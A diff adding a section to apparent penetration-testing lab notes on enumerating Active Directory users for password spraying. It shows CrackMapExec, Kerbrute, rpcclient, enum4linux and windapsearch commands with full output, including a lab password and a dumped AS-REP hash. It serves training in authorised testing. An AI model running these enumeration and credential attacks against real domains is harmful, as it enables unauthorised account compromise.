@@ -3945,6 +3945,361 @@ Fortunately, we are not flying blind. We successfully enumerated the policy and 
 
 </details>
 
+<details>
+<summary><h2>Making a Target User List</h2></summary>
+
+To mount a successful password spraying attack, we need a validated list of domain users. Depending on our current access level (unauthenticated vs. authenticated), we have multiple vectors to extract this list.
+
+**OPSEC: The Logging Mandate**
+
+Regardless of the method used, we **MUST** keep a strict execution log to crosscheck with the client's SIEM in case of alerts. 
+
+Log the following:
+* Targeted Accounts
+* Target DC IP
+* Date & Time
+* Password(s) Attempted.
+
+<details>
+<summary><h3>Method 1: Credentialed Extraction (The Safest Route)</h3></summary>
+
+Since we already possess valid credentials, we can query Active Directory directly using `CrackMapExec` (or `NetExec`). 
+
+* **The Killer Feature:** It reveals the `badpwdcount` (failed login attempts). We must **REMOVE** any users from our target list whose `badpwdcount` is close to the lockout threshold (5) to avoid accidentally locking them out.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+crackmapexec smb 172.16.5.5 -u wley -p 'transporter@4' --users
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# ...
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\healthmailboxb0dcec1           badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.481751
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\healthmailboxb3d14ef           badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.497123
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\mrb3n                          badpwdcount: 0 baddpwdtime: 2022-01-03 18:44:38.504078
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\svc_sccm                       badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.528398
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\clusteragent                   badpwdcount: 0 baddpwdtime: 2022-02-24 18:02:41.543996
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\ldap.agent                     badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.543996
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\nagiosagent                    badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.559633
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\backupagent                    badpwdcount: 0 baddpwdtime: 2022-02-24 18:02:41.559633
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\solarwindsmonitor              badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.575276
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\proxyagent                     badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.575276
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\freightlogisticsuser           badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.590880
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\sp-admin                       badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.606503
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\sqlprod                        badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.622119
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\sqlqa                          badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.622119
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\sqldev                         badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.637738
+# SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\adfs                           badpwdcount: 1 baddpwdtime: 2022-02-24 18:02:41.653362
+# ...
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+<details>
+<summary><h3>Method 2: Unauthenticated / Stealth Extraction</h3></summary>
+
+If we lack valid credentials, we rely on unauthenticated enumeration.
+
+**A - Kerbrute (Stealthy)**
+
+Uses Kerberos Pre-Authentication to validate usernames without triggering standard Logon Failure alerts (Event ID 4625). It only generates TGT request logs (Event ID 4768).
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+#     __             __               __     
+#    / /_____  _____/ /_  _______  __/ /____ 
+#   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+#  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+# /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+# Version: dev (9cfb81e) - 03/16/26 - Ronnie Flathers @ropnop
+
+# 2026/03/16 22:46:23 >  Using KDC(s):
+# 2026/03/16 22:46:23 >  	172.16.5.5:88
+
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 rramirez@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+# $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:af00169556d1f81c290986a753c3d8ca$848a1c72f7273478103258ec02d93197290c7066151679dade7b099abf87f8456d90262103809caa4f53c40d91395c3e342b80a217e8e7852f804933380260cb65ed022bd5ef4a79ffc9c269e8387890a2985111a3fe2bb07dc78a1d5647e6e5a21a4680ab288aad161fd8a7308cf2f4b56e01c23178d7c22ca0cb3318134447a9afb98874edbd288976ac5fb95499a4356ec262c56326184f85f284186b7378bc44697de18fe5fcfcf8d3c42bcbbfdc8f70d636934171ec56677ba011e9f4ef7f162eff9d88a0898b8223b9e5fad903c4a03d65ec45918c2cdd7b363e8262bd17974c4283abb2e363ff678926c15080e874039ce95d62583f00a731ff35af50eb9b485c42d542883b91
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 mmorgan@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jwallace@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jsantiago@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 gdavis@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 mrichardson@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 mharrison@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 tgarcia@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jmay@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jmontgomery@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 jhopkins@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 dpayne@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 mhicks@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 adunn@inlanefreight.local
+# 2026/03/16 22:46:23 >  [+] VALID USERNAME:	 lmatthews@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 avazquez@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 mlowe@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 jmcdaniel@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 csteele@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 mmullins@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 mochoa@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 aslater@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 ehoffman@inlanefreight.local
+# 2026/03/16 22:46:24 >  [+] VALID USERNAME:	 ehamilton@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 cpennington@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 srosario@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 lbradford@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 halvarez@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 gmccarthy@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 dbranch@inlanefreight.local
+# 2026/03/16 22:46:25 >  [+] VALID USERNAME:	 mshoemaker@inlanefreight.local
+# 2026/03/16 22:46:26 >  [+] VALID USERNAME:	 mholliday@inlanefreight.local
+# 2026/03/16 22:46:26 >  [+] VALID USERNAME:	 ngriffith@inlanefreight.local
+# 2026/03/16 22:46:26 >  [+] VALID USERNAME:	 sinman@inlanefreight.local
+# 2026/03/16 22:46:26 >  [+] VALID USERNAME:	 minman@inlanefreight.local
+# 2026/03/16 22:46:26 >  [+] VALID USERNAME:	 rhester@inlanefreight.local
+# 2026/03/16 22:46:26 >  [+] VALID USERNAME:	 rburrows@inlanefreight.local
+# 2026/03/16 22:46:27 >  [+] VALID USERNAME:	 dpalacios@inlanefreight.local
+# 2026/03/16 22:46:28 >  [+] VALID USERNAME:	 strent@inlanefreight.local
+# 2026/03/16 22:46:29 >  [+] VALID USERNAME:	 fanthony@inlanefreight.local
+# 2026/03/16 22:46:29 >  [+] VALID USERNAME:	 evalentin@inlanefreight.local
+# 2026/03/16 22:46:29 >  [+] VALID USERNAME:	 sgage@inlanefreight.local
+# 2026/03/16 22:46:29 >  [+] VALID USERNAME:	 jshay@inlanefreight.local
+# 2026/03/16 22:46:30 >  [+] VALID USERNAME:	 jhermann@inlanefreight.local
+# 2026/03/16 22:46:31 >  [+] VALID USERNAME:	 whouse@inlanefreight.local
+# 2026/03/16 22:46:31 >  [+] VALID USERNAME:	 emercer@inlanefreight.local
+# 2026/03/16 22:46:32 >  [+] VALID USERNAME:	 wshepherd@inlanefreight.local
+# 2026/03/16 22:46:33 >  Done! Tested 48705 usernames (56 valid) in 10.033 seconds
+```
+
+</td>
+</tr>
+</table>
+
+**B. SMB Null Session (Legacy)**
+
+Exploits anonymous SMB access to dump users via RPC.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+rpcclient -U "" -N 172.16.5.5 -c "enumdomusers"
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# user:[administrator] rid:[0x1f4]
+# user:[guest] rid:[0x1f5]
+# user:[krbtgt] rid:[0x1f6]
+# user:[lab_adm] rid:[0x3e9]
+# user:[htb-student] rid:[0x457]
+# user:[avazquez] rid:[0x458]
+# user:[pfalcon] rid:[0x459]
+# user:[fanthony] rid:[0x45a]
+# user:[wdillard] rid:[0x45b]
+# user:[lbradford] rid:[0x45c]
+# user:[sgage] rid:[0x45d]
+# user:[asanchez] rid:[0x45e]
+# user:[dbranch] rid:[0x45f]
+# user:[ccruz] rid:[0x460]
+# user:[njohnson] rid:[0x461]
+# ...
+# user:[linim1947] rid:[0x64d]
+# user:[frimake] rid:[0x64e]
+# user:[aunder] rid:[0x64f]
+# user:[tagoink] rid:[0x650]
+# user:[fairse1979] rid:[0x651]
+# user:[weesamight] rid:[0x652]
+# user:[intownes99] rid:[0x653]
+```
+
+</td>
+</tr>
+</table>
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# administrator
+# guest
+# krbtgt
+# lab_adm
+# htb-student
+# avazquez
+# pfalcon
+# fanthony
+# wdillard
+# lbradford
+# sgage
+# asanchez
+# ...
+# tagoink
+# fairse1979
+# weesamight
+# intownes99
+```
+
+</td>
+</tr>
+</table>
+
+**C. LDAP Anonymous Bind (Legacy)**
+
+Queries the directory directly if anonymous binds are enabled.
+
+<table width="100%">
+<tr>
+<td colspan="2"> ⚔️ <b>bash — Linux - AttackHost</b> </td>
+</tr>
+<tr>
+<td width="20%">
+
+**`kali@kali:~$`**
+
+</td>
+<td>
+
+```bash
+windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+```
+
+</td>
+</tr>
+<tr>
+<td colspan="2">
+
+---
+
+```bash
+# guest
+# ACADEMY-EA-DC01$
+# ACADEMY-EA-MS01$
+# htb-student
+# avazquez
+# pfalcon
+# fanthony
+# wdillard
+# lbradford
+# sgage
+# asanchez
+# dbranch
+# ccruz
+# njohnson
+# mholliday
+# mshoemaker
+# aslater
+# kprentiss
+# ...
+# fatinvand
+# therharded
+# exproning
+# proome
+# tareurery84
+# ancralows96
+# tinswas
+# gradde
+# nexcle42
+# curpose61
+# adaughicell
+# youlp1975
+# thearratheng1964
+```
+
+</td>
+</tr>
+</table>
+
+</details>
+
+</details>
+
 </details>
 
 ---
